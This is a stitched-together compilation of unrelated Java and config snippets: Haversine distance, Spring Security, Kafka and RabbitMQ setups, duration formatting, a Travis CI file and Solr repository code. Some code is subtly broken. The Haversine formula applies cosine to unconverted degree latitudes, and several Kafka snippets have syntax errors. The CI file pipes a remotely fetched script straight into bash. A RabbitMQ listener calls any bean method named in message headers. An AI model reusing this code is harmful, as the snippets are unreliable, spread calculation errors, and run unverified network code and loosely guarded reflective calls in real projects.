    /**
     * Haversine distance between two points.
     *
     * @param point1
     * @param point2
     * @return the distance in KM
     */

    public double calculateDistance(Point point1, Point point2) {
        double deltaLat = Math.toRadians(point2.latitude() - point1.latitude());
        double deltaLon = Math.toRadians(point2.longitude() - point1.longitude());
        double a = Math.pow(Math.sin(deltaLat / 2), 2) + Math.pow(Math.sin(deltaLon / 2), 2)
                * Math.cos(point1.latitude()) * Math.cos(point2.latitude());
        double c = 2 * Math.asin(Math.sqrt(a));
        return EARTH_RADIUS * c;
    }
}


import com.fasterxml.jackson.annotation.JsonCreator;
import com.fasterxml.jackson.annotation.JsonProperty;
import com.tngtech.demo.weather.domain.gis.Point;
import lombok.Builder;
import lombok.EqualsAndHashCode;
import lombok.ToString;

@EqualsAndHashCode
@ToString
@Builder
public class Station implements Point {

    public final String name;

    public final double latitude;

    public final double longitude;

    @JsonCreator
    public Station(
            @JsonProperty("name") String name,
            @JsonProperty("latitude") Double latitude,
            @JsonProperty("longitude") Double longitude) {
        this.name = name;
        this.latitude = latitude;
        this.longitude = longitude;
    }

    @Override
    public double latitude() {
        return latitude;
    }

    @Override
    public double longitude() {
        return longitude;
    }
}


/**
 * The various types of data points we can collect.
 */

public enum DataPointType {
    WIND,
    TEMPERATURE,
    HUMIDITY,
    PRESSURE,
    CLOUDCOVER,
    PRECIPITATION
}

https://github.com/TNG/rest-demo-jersey/blob/master/src/main/java/com/tngtech/demo/weather/domain/measurement/AtmosphericData.java

https://askvoprosy.com/tegi/java


import com.gearservice.config.filter.ReCaptchaAuthFilter;
import com.gearservice.config.properties.ReCaptchaProperties;
import com.gearservice.service.UserService;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpMethod;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.web.AuthenticationEntryPoint;
import org.springframework.security.web.authentication.www.BasicAuthenticationFilter;
import org.springframework.security.web.csrf.CsrfToken;
import org.springframework.security.web.csrf.CsrfTokenRepository;
import org.springframework.security.web.csrf.HttpSessionCsrfTokenRepository;
import org.springframework.security.web.header.writers.StaticHeadersWriter;
import org.springframework.security.web.session.SessionManagementFilter;
import org.springframework.web.filter.OncePerRequestFilter;
import org.springframework.web.util.WebUtils;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.sql.DataSource;
import java.io.IOException;

/**
 * Class SecurityConfiguration is configuration
 * Config for Spring Security
 *
 * @version 1.1
 * @author Dmitry
 * @since 22.01.2016
 */

@Configuration
@EnableWebSecurity
@EnableConfigurationProperties(ReCaptchaProperties.class)
class SecurityConfiguration extends WebSecurityConfigurerAdapter {

    private final DataSource dataSource;
    private final UserService userDetailsService;
    private final ReCaptchaProperties reCaptchaProperties;

    @Autowired
    public SecurityConfiguration(DataSource dataSource, UserService userDetailsService, ReCaptchaProperties reCaptchaProperties) {
        this.dataSource = dataSource;
        this.userDetailsService = userDetailsService;
        this.reCaptchaProperties = reCaptchaProperties;
    }

    /**
     * Method configureGlobal configures base params.
     * Add overrated userDetailsService, new BCrypt password encoder, new query for searching users
     * @param auth is AuthenticationManagerBuilder for config object
     * @throws Exception
     */
    @Autowired
    public void configureGlobal(AuthenticationManagerBuilder auth) throws Exception {
        auth
                .userDetailsService(userDetailsService).passwordEncoder(passwordEncoder()).and()
                .jdbcAuthentication().dataSource(dataSource)
                .usersByUsernameQuery(
                        "SELECT username, password, enabled, full_name FROM user WHERE username=?")
                .authoritiesByUsernameQuery(
                        "SELECT username, role FROM authority WHERE username=?");
    }

    /**
     * Method passwordEncoder creates new BCrypt password encoder
     * @return new BCrypt password encoder
     */
    @Bean
    public PasswordEncoder passwordEncoder() {return new BCryptPasswordEncoder();}

    /**
     * Method configure is main config class for http security
     * @param http is HttpSecurity for configuring http security
     * @throws Exception
     */
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
                .httpBasic()
                    .authenticationEntryPoint(new RedirectAuthenticationEntryPoint())
                .and().rememberMe()
                    .userDetailsService(userDetailsService)
                    .key("steam")
                    .useSecureCookie(true)
                    .tokenValiditySeconds(25000)
                .and().authorizeRequests()
                    .antMatchers("/index.html", "/", "/login", "/javascript/**", "/fonts/**",
                            "/stylesheets/**", "/images/**", "/api/currency-rate", "/favicon.ico")
                    .permitAll()
                    .antMatchers(HttpMethod.GET, "/attention").hasAnyAuthority("ROLE_ADMIN", "ROLE_ENGINEER", "ROLE_BOSS")
                    .antMatchers(HttpMethod.GET, "/delay").hasAnyAuthority("ROLE_ADMIN", "ROLE_ENGINEER", "ROLE_BOSS")
                    .antMatchers(HttpMethod.POST, "/api/cheques/{\\d+}/diagnostics").hasAnyAuthority("ROLE_ADMIN", "ROLE_ENGINEER", "ROLE_BOSS")
                    .antMatchers(HttpMethod.DELETE, "/api/cheques/{\\d+}/diagnostics/{\\d+}").hasAuthority("ROLE_ADMIN")
                    .antMatchers(HttpMethod.DELETE, "/api/cheques/{\\d+}/notes/{\\d+}").hasAuthority("ROLE_ADMIN")
                    .antMatchers(HttpMethod.DELETE, "/api/cheques/{\\d+}").hasAuthority("ROLE_ADMIN")
                    .antMatchers(HttpMethod.DELETE, "/api/photo/{\\d+}/{\\d+}").hasAuthority("ROLE_ADMIN")
                    .antMatchers(HttpMethod.GET, "/api/currency-rate-list").hasAuthority("ROLE_ADMIN")
                    .antMatchers(HttpMethod.POST, "/api/currency-rate").hasAuthority("ROLE_ADMIN")
                    .antMatchers(HttpMethod.POST, "/api/user").hasAuthority("ROLE_ADMIN")
                    .antMatchers(HttpMethod.DELETE, "/api/user/{\\d+}").hasAuthority("ROLE_ADMIN")
                    .anyRequest().authenticated()
                .and().logout()
                    .logoutSuccessUrl("/")
                    .invalidateHttpSession(true)
                    .deleteCookies("JSESSIONID")
                .and().csrf()
                    .csrfTokenRepository(csrfTokenRepository())
                .and()
                .addFilterAfter(csrfHeaderFilter(), SessionManagementFilter.class)
                .addFilterBefore(new ReCaptchaAuthFilter(reCaptchaProperties), BasicAuthenticationFilter.class)
                .headers().contentSecurityPolicy("default-src https: 'self'; " +
                    "object-src 'none'; " +
                    "script-src 'self' https://www.google.com https://www.gstatic.com; " +
                    "style-src 'self' 'unsafe-inline'; " +
                    "img-src 'self' data:; " +
                    "connect-src 'self' ws://127.0.0.1:35729")
                .and().addHeaderWriter(new StaticHeadersWriter("Referrer-Policy", "no-referrer-when-downgrade"));
    }

    /**
     * Method RedirectAuthenticationEntryPoint is entry point for correct handling error with unauthorized exception
     */
    private class RedirectAuthenticationEntryPoint implements AuthenticationEntryPoint {
        @Override
        public void commence(HttpServletRequest request, HttpServletResponse response, AuthenticationException authException) throws IOException, ServletException {
            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, authException.getMessage());
        }
    }

    /**
     * Method csrfHeaderFilter creates filter for correct csrf security
     * @return OncePerRequestFilter for correct csrf security
     */
    private Filter csrfHeaderFilter() {
        return new OncePerRequestFilter() {
            @Override
            protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
                    throws ServletException, IOException {
                CsrfToken csrf = (CsrfToken) request.getAttribute(CsrfToken.class.getName());
                if (csrf != null) {
                    Cookie cookie = WebUtils.getCookie(request, "XSRF-TOKEN");
                    String token = csrf.getToken();
                    if (cookie == null || token != null && !token.equals(cookie.getValue())) {
                        cookie = new Cookie("XSRF-TOKEN", token);
                        cookie.setPath("/");
                        cookie.setSecure(true);
                        response.addCookie(cookie);
                    }
                }
                filterChain.doFilter(request, response);
            }
        };
    }

    /**
     * Method csrfTokenRepository creates repository for csrf security token
     * @return repository for csrf security token
     */
    private CsrfTokenRepository csrfTokenRepository() {
        HttpSessionCsrfTokenRepository repository = new HttpSessionCsrfTokenRepository();
        repository.setHeaderName("X-XSRF-TOKEN");
        return repository;
    }
}
==============================================================================================================
@Bean
public ConcurrentKafkaListenerContainerFactory<String, String> kafkaListenerContainerFactory() {
    ConcurrentKafkaListenerContainerFactory<String, String> factory = new ConcurrentKafkaListenerContainerFactory();
    factory.setConsumerFactory(consumerFactory());
    factory.getContainerProperties().setAckOnError(false);
    factory.getContainerProperties().setAckMode(AckMode.RECORD);
    factory.setErrorHandler(new SeekToCurrentErrorHandler());
    return factory;
}

@Bean
public SeekToCurrentErrorHandler errorHandler(BiConsumer<ConsumerRecord<?, ?>, Exception> recoverer) {
    SeekToCurrentErrorHandler handler = new SeekToCurrentErrorHandler(recoverer);
    handler.addNotRetryableException(IllegalArgumentException.class);
    return handler;
}

DeadLetterPublishingRecoverer recoverer = new DeadLetterPublishingRecoverer(template,
        (r, e) -> {
            if (e instanceof FooException) {
                return new TopicPartition(r.topic() + ".Foo.failures", r.partition());
            }
            else {
                return new TopicPartition(r.topic() + ".other.failures", r.partition());
            }
        });
ErrorHandler errorHandler = new SeekToCurrentErrorHandler(recoverer, new FixedBackOff(0L, 2L));

@Bean
public KafkaJaasLoginModuleInitializer jaasConfig() throws IOException {
    KafkaJaasLoginModuleInitializer jaasConfig = new KafkaJaasLoginModuleInitializer();
    jaasConfig.setControlFlag("REQUIRED");
    Map<String, String> options = new HashMap<>();
    options.put("useKeyTab", "true");
    options.put("storeKey", "true");
    options.put("keyTab", "/etc/security/keytabs/kafka_client.keytab");
    options.put("principal", "kafka-client-1@EXAMPLE.COM");
    jaasConfig.setOptions(options);
    return jaasConfig;
}

@Bean(name = KafkaStreamsDefaultConfiguration.DEFAULT_STREAMS_CONFIG_BEAN_NAME)
public KafkaStreamsConfiguration kStreamsConfigs() {
    Map<String, Object> props = new HashMap<>();
    ...
    props.put(StreamsConfig.DEFAULT_DESERIALIZATION_EXCEPTION_HANDLER_CLASS_CONFIG,
            RecoveringDeserializationExceptionHandler.class);
    props.put(RecoveringDeserializationExceptionHandler.KSTREAM_DESERIALIZATION_RECOVERER, recoverer());
    ...
    return new KafkaStreamsConfiguration(props);
}

@Bean
public DeadLetterPublishingRecoverer recoverer() {
    return new DeadLetterPublishingRecoverer(kafkaTemplate(),
            (record, ex) -> new TopicPartition("recovererDLQ", -1));
}
==============================================================================================================
@TestPropertySource(locations = "classpath:/test.properties")
@EmbeddedKafka(topics = { "any-topic", "${kafka.topics.another-topic}" },
        brokerProperties = { "log.dir=${kafka.broker.logs-dir}",
                            "listeners=PLAINTEXT://localhost:${kafka.broker.port}",
                            "auto.create.topics.enable=${kafka.broker.topics-enable:true}" }
        brokerPropertiesLocation = "classpath:/broker.properties")
==============================================================================================================
@EmbeddedKafka
public class EmbeddedKafkaConditionTests {

	@Test
	public void test(EmbeddedKafkaBroker broker) {
		String brokerList = broker.getBrokersAsString();
        ...
	}

}
==============================================================================================================
@Bean
public KStream<byte[], byte[]> kStream(StreamsBuilder kStreamBuilder,
        MessagingTransformer<byte[], byte[], byte[]> transformer)  transformer) {
    KStream<byte[], byte[]> stream = kStreamBuilder.stream(STREAMING_TOPIC1);
    stream.mapValues((ValueMapper<byte[], byte[]>) String::toUpperCase)
            ...
            .transform(() -> transformer)
            .to(streamingTopic2);

    stream.print(Printed.toSysOut());

    return stream;
}

@Bean
@DependsOn("flow")
public MessagingTransformer<byte[], byte[], String> transformer(
        MessagingFunction function) {

    MessagingMessageConverter converter = new MessagingMessageConverter();
    converter.setHeaderMapper(new SimpleKafkaHeaderMapper("*"));
    return new MessagingTransformer<>(function, converter);
}

@Bean
public IntegrationFlow flow() {
    return IntegrationFlows.from(MessagingFunction.class)
        ...
        .get();
}
==============================================================================================================
public static String apacheFormat(long millis) throws ParseException {
    return DurationFormatUtils.formatDuration(millis, "HH:mm:ss");
}

public static String formatTimeUnit(long millis) throws ParseException {
String formatted = String.format(
        "%02d:%02d:%02d",
        TimeUnit.MILLISECONDS.toHours(millis),
        TimeUnit.MILLISECONDS.toMinutes(millis)
                - TimeUnit.HOURS.toMinutes(TimeUnit.MILLISECONDS.toHours(millis)),
        TimeUnit.MILLISECONDS.toSeconds(millis)
                - TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS.toMinutes(millis)));
    return formatted;
}

public static String formatDuration(final long millis) {
    long seconds = (millis / 1000) % 60;
    long minutes = (millis / (1000 * 60)) % 60;
    long hours = millis / (1000 * 60 * 60);

    StringBuilder b = new StringBuilder();
    b.append(hours == 0 ? "00" : hours < 10 ? String.valueOf("0" + hours) : 
    String.valueOf(hours));
    b.append(":");
    b.append(minutes == 0 ? "00" : minutes < 10 ? String.valueOf("0" + minutes) :     
    String.valueOf(minutes));
    b.append(":");
    b.append(seconds == 0 ? "00" : seconds < 10 ? String.valueOf("0" + seconds) : 
    String.valueOf(seconds));
    return b.toString();
}

public static String combinationFormatter(final long millis) {
    long seconds = TimeUnit.MILLISECONDS.toSeconds(millis)
            - TimeUnit.MINUTES.toSeconds(TimeUnit.MILLISECONDS.toMinutes(millis));
    long minutes = TimeUnit.MILLISECONDS.toMinutes(millis)
            - TimeUnit.HOURS.toMinutes(TimeUnit.MILLISECONDS.toHours(millis));
    long hours = TimeUnit.MILLISECONDS.toHours(millis);

    StringBuilder b = new StringBuilder();
    b.append(hours == 0 ? "00" : hours < 10 ? String.valueOf("0" + hours) : 
    String.valueOf(hours));
    b.append(":");
    b.append(minutes == 0 ? "00" : minutes < 10 ? String.valueOf("0" + minutes) : 
    String.valueOf(minutes));
        b.append(":");
    b.append(seconds == 0 ? "00" : seconds < 10 ? String.valueOf("0" + seconds) : 
    String.valueOf(seconds));
    return b.toString(); 
 }
==============================================================================================================
language: java
dist: trusty
jdk:
  - oraclejdk8
env:
  global:
  - secure: D8Z2pmvfy0LETBW5A6xzdU/Q8dEkbVAptbofWZIpHEl4dWC6vVux3A5MeRIXp6Sv5n/Vyw4pIh+dXcUrrLtofhLksTLIEgeNpG6hC+ctMYMxW63U2skIxa6RQ8iZy5/qQ9btJH3hd4hJI3u2sQ2NgHpw/KCj1sRrT8aIrS9QQl4zxxLd8D8HPUlr3O/eV1Ik38quCPmmrp/6jRJnZnE1Y3IcNqt/L0CLsZwqued6WyqWBU/2yskGxmij5i88RPgxN1oau6HUtPW8lqJhwdnTOgi9/t9kDkItopPC25A6gSGwwI75gF1jvWe95aQQfqLwHnOZcjEEBs3836ibQT5PPTr9vtKLssH35uM22pAWIlP38zilOIVN4Jy3nYC983ef7ZtBLuBFBatmOUBYOrlFN4GdlVPUOcbZFsBnjQnDoSADJ+fDt6Q/WJ2knudfc82kle0Jul8fIKP5OIGLk1ZhhuBYkbM6k8l3offk/cRIhVI5D94zm2UJkw+8MAlP6ffcPNMUzCU9YofaB0lX3j5/JKwntph27VnNUsplsUtM0uOEtN+4VuzdzAXDnm1yp4fGObffrMUJ9coG+kEBYaKFoLgFoVv1H76Xn1FLWtbqBOnC6Se5FPoxYVD2eYMjNRuEP9sYs63jS0oYjWj+Z2z1rkH26BgyGcCZxCj7qTzvTwE=
  - secure: DTfPB0fMpchGnbeV5YVevVQBoqow1WCeSZqgjKigsVgkKTFhuX03Wnbjce7E669p2vioPclxrF6jvjegDZCexIjUYNRZhfNZtvaZ6/kzwOC9vlC9b+5WJ6XSG6gm7YZaQ2TP353c8bqBSyVW2LvECtwZZxM3x6pt8zA2UX100uh/+0Ftc3QbBoBXZkgaXfCT84P/OO52hPuZZl04u+TJabrwt3TPxRUIcxTrGUnW37wOPxyYt6qcFZplAmjorm6vFIcE0FNH90yViqEp3rKBtQGgDW0XnmoTYLRCEDDdRmTyGFoOjjnpZuaA41iiUJx6F3H63zAQOpB8mefjvYGKcnvIVHTHWfPOwNycSiATQ9g8QV5Z3y6HE+Kk5wDcL/USiOl4tn651s4eY+tE2sswpRyMfQa/f6x73xYT0Wqa22Xss4uzLtVJhxcZIku8pxDSJg40XQxSUXwuwfU3OJvNjsKVPjXnZ3QYrvQN7A6ZEDRw60BLQ+XVvlHSdLAeWPbtUWeUc1ke/x7QhTGIskkGlvV9AlW6LQDkfX5YwjQ9ZYCyAmfSjmN4J01oBQbbj+/XoS1iIna7VpWEEPbMw6sG+CF3jyk14EwmU2l8G3ZxtXBkzzCH5joIOTQZh8iUZ1BxTqBWlExHlcaUHJxG12udc/MLzkKUDIcOEIOlkzuwfhU=
script:
  - ./gradlew clean check --refresh-dependencies
  - ./gradlew clean check --refresh-dependencies -PfasterxmlVersion=2.8.4
  - ./gradlew clean check --refresh-dependencies -PfasterxmlVersion=2.9.1
  - ./gradlew codeCoverageReport
after_success:
  - bash <(curl -s https://codecov.io/bash)
  - ./gradlew uploadArchives -PnexusUsername="${SONATYPE_USER}" -PnexusPassword="${SONATYPE_PASS}"
==============================================================================================================
@SpringBootApplication
public class KReplyingApplication {

    public static void main(String[] args) {
        SpringApplication.run(KReplyingApplication.class, args);
    }

    @KafkaListener(id="server", topics = "kRequests")
    @SendTo // use default replyTo expression
    public String listen(String in) {
        System.out.println("Server received: " + in);
        return in.toUpperCase();
    }

    @Bean
    public NewTopic kRequests() {
        return new NewTopic("kRequests", 10, (short) 2);
    }

    @Bean // not required if Jackson is on the classpath
    public MessagingMessageConverter simpleMapperConverter() {
        MessagingMessageConverter messagingMessageConverter = new MessagingMessageConverter();
        messagingMessageConverter.setHeaderMapper(new SimpleKafkaHeaderMapper());
        return messagingMessageConverter;
    }

}
==============================================================================================================
#Bean
public ConcurrentKafkaListenerContainerFactory kafkaListenerContainerFactory() {
ConcurrentKafkaListenerContainerFactory factory = new ConcurrentKafkaListenerContainerFactory();
factory.setConsumerFactory(new DefaultKafkaConsumerFactory<>(kafkaProps()));
factory.getContainerProperties().setAckOnError(false);
factory.getContainerProperties().setErrorHandler(new SeekToCurrentErrorHandler());
factory.getContainerProperties().setAckMode(AbstractMessageListenerContainer.AckMode.MANUAL);
return factory;
}

@Bean
public ConcurrentKafkaListenerContainerFactory kafkaListenerContainerFactory(
    ConcurrentKafkaListenerContainerFactoryConfigurer configurer,
    ConsumerFactory<Object, Object> kafkaConsumerFactory,
    KafkaTemplate<Object, Object> template) {
  ConcurrentKafkaListenerContainerFactory<Object, Object> factory = new ConcurrentKafkaListenerContainerFactory<>();
  configurer.configure(factory, kafkaConsumerFactory);
  factory.setErrorHandler(new SeekToCurrentErrorHandler(
      new DeadLetterPublishingRecoverer(template), 3));
  return factory;
}

@KafkaListener(id = "fooGroup", topics = "topic1")
public void listen(String in) {
  logger.info("Received: " + in);
  if (in.startsWith("foo")) {
    throw new RuntimeException("failed");
  }
}

@KafkaListener(id = "dltGroup", topics = "topic1.DLT")
public void dltListen(String in) {
  logger.info("Received from DLT: " + in);
}
==============================================================================================================
import org.springframework.amqp.core.Queue;
import org.springframework.amqp.rabbit.connection.CachingConnectionFactory;
import org.springframework.amqp.rabbit.connection.ConnectionFactory;
import org.springframework.amqp.rabbit.core.RabbitTemplate;
import org.springframework.amqp.support.converter.Jackson2JsonMessageConverter;
import org.springframework.amqp.support.converter.MessageConverter;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class MQProducerConfig {
	@Value("${spring.rabbitmq.queuename}")
	private String queueName;
	@Value("${spring.rabbitmq.exchange}")
	private String queueExchange;
	@Value("${spring.rabbitmq.routingkey}")
	private String routingkey;
	 
    @Bean
    public MessageConverter messageConverter() {
        return new Jackson2JsonMessageConverter();
    }
    
    @Bean
    @ConfigurationProperties(prefix="spring.rabbitmq")
    public ConnectionFactory connectionFactory(){
    	return new CachingConnectionFactory (); //publisherConfirms 消息确认回调
    }
    
    @Bean
    public RabbitTemplate template(ConnectionFactory connectionFactory, MessageConverter converter) {
        RabbitTemplate template = new RabbitTemplate(connectionFactory);
        //template.setChannelTransacted(false);
        template.setMandatory(true);
        template.setExchange(queueExchange);
        template.setRoutingKey(routingkey);
        template.setMessageConverter(converter);
        return template;
    }

    @Bean
    public Queue queue() {
        return new Queue(queueName, true);
    }
    
}

import java.util.Date;
import java.util.UUID;

import javax.annotation.Resource;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.amqp.AmqpException;
import org.springframework.amqp.core.Message;
import org.springframework.amqp.core.MessagePostProcessor;
import org.springframework.amqp.rabbit.core.RabbitTemplate;
import org.springframework.amqp.rabbit.core.RabbitTemplate.ConfirmCallback;
import org.springframework.amqp.rabbit.support.CorrelationData;
import org.springframework.beans.factory.annotation.Value;

public abstract class BasicService implements ConfirmCallback {
	private Logger logger = LoggerFactory.getLogger(this.getClass());
	
	@Resource
	public RabbitTemplate rabbitTemplate;
	@Value("${spring.rabbitmq.routingkey}")
	private String routingkey;
	@Value("${spring.rabbitmq.appid}")
	private String appId;

    public void sendMessage(final String serviceName, final String serviceMethodName,final String correlationId, Object request) {
    	logger.info("sendMessage [this.{}, serviceMethodName:{} serviceName:{} correlationId: {}]", this.getClass(), serviceMethodName, serviceName, correlationId);
    	rabbitTemplate.setConfirmCallback(this);
    	rabbitTemplate.setCorrelationKey(correlationId);
    	rabbitTemplate.convertAndSend(routingkey, request, new MessagePostProcessor() {            
        	@Override
            public Message postProcessMessage(Message message) throws AmqpException {
                message.getMessageProperties().setAppId(appId);
                message.getMessageProperties().setTimestamp(new Date());
                message.getMessageProperties().setMessageId(UUID.randomUUID().toString());
                message.getMessageProperties().setCorrelationId(correlationId.getBytes());
                message.getMessageProperties().setHeader("ServiceMethodName", serviceMethodName);
                message.getMessageProperties().setHeader("ServiceName", serviceName);
                return message;
            }
        }, new CorrelationData(correlationId));
    }

    /**
     * 抽象回调方法
     */
	@Override
	public abstract void confirm(CorrelationData correlationData, boolean ack, String cause);
	
}

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import javax.annotation.Resource;

import org.springframework.amqp.core.Message;
import org.springframework.amqp.rabbit.core.ChannelAwareMessageListener;
import org.springframework.amqp.rabbit.core.RabbitTemplate;
import org.springframework.amqp.support.converter.MessageConverter;
import org.springframework.beans.BeansException;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.ApplicationContext;
import org.springframework.context.ApplicationContextAware;
import org.springframework.stereotype.Component;

import com.rabbitmq.client.Channel;

/**
 * 消息监听
 * @author lonyee
 *
 */
@Component
public class MQAwareListener implements ChannelAwareMessageListener, ApplicationContextAware {

    @Resource
    private MessageConverter messageConverter;
    @Resource
    private RabbitTemplate rabbitTemplate;
	@Value("${spring.rabbitmq.appid}")
	private String appId;

    private ApplicationContext ctx;

    @Override
    public void onMessage(Message message, Channel channel) throws IOException {
        System.out.println("----- received" + message.getMessageProperties());
		try {
			Object msg = messageConverter.fromMessage(message);
			if (!appId.equals(message.getMessageProperties().getAppId())){
		        channel.basicNack(message.getMessageProperties().getDeliveryTag(), false, false);
		        throw new SecurityException("非法应用appId:" + message.getMessageProperties().getAppId());
			}
			Object service = ctx.getBean(message.getMessageProperties().getHeaders().get("ServiceName").toString());
			String serviceMethodName = message.getMessageProperties().getHeaders().get("ServiceMethodName").toString();
			Method method = service.getClass().getMethod(serviceMethodName, msg.getClass());
	        method.invoke(service, msg);
	        //确认消息成功消费
	        channel.basicAck(message.getMessageProperties().getDeliveryTag(), false);
		} catch (NoSuchMethodException | SecurityException | IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {
			System.out.println("------ err"+ e.getMessage());
	        channel.basicNack(message.getMessageProperties().getDeliveryTag(), false, false);
		}
    }

    @Override
    public void setApplicationContext(ApplicationContext applicationContext) throws BeansException {
        this.ctx = applicationContext;
    }

}

import org.springframework.amqp.core.AcknowledgeMode;
import org.springframework.amqp.core.Binding;
import org.springframework.amqp.core.BindingBuilder;
import org.springframework.amqp.core.Queue;
import org.springframework.amqp.core.TopicExchange;
import org.springframework.amqp.rabbit.connection.ConnectionFactory;
import org.springframework.amqp.rabbit.core.RabbitTemplate;
import org.springframework.amqp.rabbit.listener.SimpleMessageListenerContainer;
import org.springframework.amqp.rabbit.listener.adapter.MessageListenerAdapter;
import org.springframework.amqp.support.converter.Jackson2JsonMessageConverter;
import org.springframework.amqp.support.converter.MessageConverter;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class MQConsumerConfig {
	@Value("${spring.rabbitmq.queuename}")
	private String queueName ;
	@Value("${spring.rabbitmq.exchange}")
	private String queueExchange;
	@Value("${spring.rabbitmq.routingkey}")
	private String routingkey;

    @Bean
    public MessageConverter messageConverter() {
        return new Jackson2JsonMessageConverter();
    }

    @Bean
    public RabbitTemplate template(ConnectionFactory connectionFactory, MessageConverter converter) {
        RabbitTemplate template = new RabbitTemplate(connectionFactory);
        template.setMessageConverter(converter);
        return template;
    }
    
    @Bean
    public SimpleMessageListenerContainer container(ConnectionFactory connectionFactory, Queue queue, MessageListenerAdapter listenerAdapter) {
        SimpleMessageListenerContainer container = new SimpleMessageListenerContainer(connectionFactory);
        //container.setQueueNames(queueName);
        container.setQueues(queue);
        container.setExposeListenerChannel(true);
        container.setMaxConcurrentConsumers(1);
        container.setConcurrentConsumers(1);
        container.setPrefetchCount(1000);
        container.setAcknowledgeMode(AcknowledgeMode.MANUAL); //设置确认模式手工确认
        container.setMessageListener(listenerAdapter);
        return container;
    }
    
    @Bean
    public MessageListenerAdapter listenerAdapter(MQAwareListener listener, MessageConverter converter) {
        return new MessageListenerAdapter(listener, converter);
    }
    
    @Bean
    public Queue queue() {
        return new Queue(queueName, true);
    }
    
    /**
     * 创建exchange, 可以创建TopicExchange(*、#模糊匹配routing key，routing key必须包含".")，DirectExchange，FanoutExchange(无routing key概念)
     * @return
     */
    @Bean
    public TopicExchange exchange(){
        return new TopicExchange(queueExchange);
    }
    /*@Bean
    public DirectExchange exchange(){
        return new DirectExchange(queueExchange);
    }*/
    
    @Bean
    public Binding binding(Queue queue, TopicExchange exchange){
        return BindingBuilder.bind(queue).to(exchange).with(routingkey);
    }
}



import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.dao.DataAccessException;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UserDetailsService;
import org.springframework.security.core.userdetails.UsernameNotFoundException;
import org.springframework.social.security.SocialUserDetails;
import org.springframework.social.security.SocialUserDetailsService;

/**
 * This class delegates requests forward to our UserDetailsService implementation.
 * This is possible because we use the username of the user as the account ID.
 * @author Petri Kainulainen
 */
public class SimpleSocialUserDetailsService implements SocialUserDetailsService {

    private static final Logger logger = LoggerFactory.getLogger(SimpleSocialUserDetailsService.class);

    private UserDetailsService userDetailsService;

    public SimpleSocialUserDetailsService(UserDetailsService userDetailsService) {
        this.userDetailsService = userDetailsService;
    }

    /**
     * Loads the username by using the account ID of the user.
     * @param userId    The account ID of the requested user.
     * @return  The information of the requested user.
     * @throws UsernameNotFoundException    Thrown if no user is found.
     * @throws DataAccessException
     */
    @Override
    public SocialUserDetails loadUserByUserId(String userId) throws UsernameNotFoundException, DataAccessException {
        logger.debug("Loading user by user id: {}", userId);

        UserDetails userDetails = userDetailsService.loadUserByUsername(userId);
        logger.debug("Found user details: {}", userDetails);

        return (SocialUserDetails) userDetails;
    }
}


import com.nixmash.blog.solr.common.SolrSettings;
import com.nixmash.blog.solr.repository.simple.SimpleProductRepositoryImpl;
import org.apache.solr.client.solrj.embedded.EmbeddedSolrServer;
import org.apache.solr.core.CoreContainer;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import org.springframework.data.solr.core.SolrTemplate;

import java.nio.file.FileSystems;
import java.nio.file.Path;

@Configuration
@Profile("dev")
public class EmbeddedSolrContext {

	@Autowired
	private SolrSettings solrSettings;

	@Bean(name = "solrClient")
	public EmbeddedSolrServer solrServerFactoryBean() {
		String solrCoreName = solrSettings.getSolrCoreName();
		String solrHome = solrSettings.getSolrEmbeddedPath();
		Path path = FileSystems.getDefault().getPath(solrHome);
		CoreContainer container = CoreContainer.createAndLoad(path);
		return new EmbeddedSolrServer(container, solrCoreName);
	}

	@Bean
	public SolrTemplate solrTemplate() throws Exception {
		String solrCoreName = solrSettings.getSolrCoreName();
		SolrTemplate solrTemplate = new SolrTemplate(solrServerFactoryBean());
		solrTemplate.setSolrCore(solrCoreName);
		return solrTemplate;
	}

	@Bean
	public SimpleProductRepositoryImpl simpleProductRepository() throws Exception {
		SimpleProductRepositoryImpl simpleRepository = new SimpleProductRepositoryImpl();
		simpleRepository.setSolrOperations(solrTemplate());
		return simpleRepository;
	}

}

import com.nixmash.blog.solr.enums.SolrDocType;
import com.nixmash.blog.solr.model.IProduct;
import com.nixmash.blog.solr.model.Product;
import org.springframework.data.domain.Page;
import org.springframework.data.domain.PageRequest;
import org.springframework.data.domain.Pageable;
import org.springframework.data.repository.NoRepositoryBean;
import org.springframework.data.solr.core.query.*;
import org.springframework.data.solr.core.query.result.FacetPage;
import org.springframework.data.solr.repository.support.SimpleSolrRepository;

import java.util.List;

@NoRepositoryBean
public class SimpleProductRepositoryImpl extends SimpleSolrRepository<Product, String> implements SimpleBaseProductRepository {

	@Override
	public List<Product> findByAvailableTrue() {
		Query query = new SimpleQuery(new Criteria(new SimpleField(Criteria.WILDCARD)).expression(Criteria.WILDCARD));
